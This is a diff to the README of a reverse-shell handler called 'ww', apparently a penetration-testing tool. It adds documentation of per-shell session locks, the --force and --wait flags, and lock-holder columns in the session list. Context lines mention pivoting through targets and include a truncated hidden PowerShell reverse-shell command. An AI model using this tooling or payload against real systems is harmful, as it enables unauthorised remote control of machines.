@@ -153,6 +153,59 @@ ww script 1 payloads.txt
 ww close 1
 ```
 
+### Client — Session locks (dumb shells)
+
+A dumb reverse shell has no framing: commands are written raw and output is read
+from one shared buffer, so two clients using the same shell at once would
+interleave and steal each other's output.  `ww` therefore gives each dumb shell
+an **exclusive lock**, held for the duration of the command (or the whole
+interactive attach).  `ww-target` sessions do **not** need this: each command is
+framed and matched by sequence number, so concurrent `send`s are safe there and
+are never blocked.
+
+The lock belongs to the client's **control connection**, so it is released the
+moment that connection ends — including when the client is `kill -9`'d or
+crashes.  A shell cannot be left hardlocked by a dying client.  Two extra safety
+nets cover the rest: a TCP control connection carries a lease that lapses if a
+half-open peer stops responding (Unix sockets need none — the kernel closes the
+fd), and `--force` breaks a lock held by a client that is alive but stuck.
+
+```bash
+# While another client holds the shell, a second one is refused:
+ww send 2 "id"
+# Error: session is locked by ben (uid=1000) for 4s (use --force to take it over, or --wait SECS)
+
+ww send --wait 10 2 "id"   # queue until the holder finishes
+ww send --force 2 "id"     # take the lock over (stops the holder's pending read)
+ww interact --force 2      # take over and attach interactively
+
+# Flags may go before or after the command:
+ww send 2 -t 5 "sleep 4; echo done"
+ww send 2 "sleep 4; echo done" -t 5
+```
+
+`ww list` marks locked shells with the holder's identity, and a banner above the
+table tells you whether *your own* connection is authenticated:
+
+```
+🔓 authenticated over tcp as SHA256:9f2c… (key)
+
+ID    Address                   Alive   Platform         Lock                       Age
+-------------------------------------------------------------------------------------------
+1     [ww-target] 127.0.0.1:5390 ✓       linux/x86_64     -                          2s
+2     10.0.0.9:40012            ✓       -                🔒 ben (uid=1000) 14s       9s
+3     10.0.0.7:50122            ✓       -                🔒 (you) 3s                12s
+```
+
+- 🔒 **red** = held by another client, 🔒 **green** = held by you, `-` = free (or
+a `ww-target` session, which is concurrency-safe and never takes one).
+- The banner is **green** when the control connection is key-authenticated,
+**yellow** for the unauthenticated local Unix socket, **red** for an
+unauthenticated TCP control connection.  Colour is suppressed when stdout is not
+a terminal or `NO_COLOR` is set.
+- The holder is resolved from `SO_PEERCRED` on Unix (`ben (uid=1000)`) or the
+authenticated key fingerprint on TCP.  Closing a session releases its lock.
+
 ### Client — File Transfer (smart agent only)
 
 ```bash
@@ -396,6 +449,7 @@ target> powershell -NoP -NonI -W Hidden -Exec Bypass -C "$c=New-Object System.Ne
 - **No stale output** — per-command sequence numbers in `FRAME_CMD`/`FRAME_CMD_RESULT` prevent output from bleeding between commands
 - **File transfers** — push/pull files with SHA-256 hash verification
 - **Pivoting** — `ww forward` (one port) and `ww socks` (SOCKS5 + HTTP CONNECT) dial *from* the target, so you can reach hosts only it can see; the only new listener is a loopback port on your machine
+- **Session locks** — dumb shells are used by one client at a time via a connection-owned lock that is released automatically when the holder exits or dies (lease + `--force` as backstops); `ww list` shows the holder and whether your connection is authenticated
 - **Interactive mode** — full raw terminal, line editing, word navigation, Ctrl+C detach
 - **Scripting** — run command lists from files with comment and empty-line support
 - **Session persistence** — shells stay alive when you detach from interactive mode
